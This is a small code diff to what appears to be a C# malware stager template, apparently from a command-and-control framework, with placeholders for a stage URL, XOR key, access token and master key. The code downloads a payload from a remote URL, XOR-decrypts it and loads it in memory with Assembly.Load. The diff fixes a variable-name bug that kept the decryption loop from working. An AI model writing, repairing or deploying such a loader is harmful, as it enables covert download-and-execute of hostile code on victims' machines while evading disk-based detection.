@@ -23,9 +23,8 @@
             wc.Proxy = defaultProxy;
         }
         byte[] b = wc.DownloadData("${stagePublicURL}");
-        //string k = BitConverter.ToString(new SHA256CryptoServiceProvider().ComputeHash(Convert.FromBase64String("${masterKey}"))).Replace("-", string.Empty).ToLower();
         string k = "${xorKey}";
-        for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^ key[i % key.Length]); }
+        for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^ k[i % k.Length]); }
         string[] parameters = new string[] {"${accessToken}", "${masterKey}"};
         object[] args = new object[] {parameters};
         Assembly a = Assembly.Load(b);
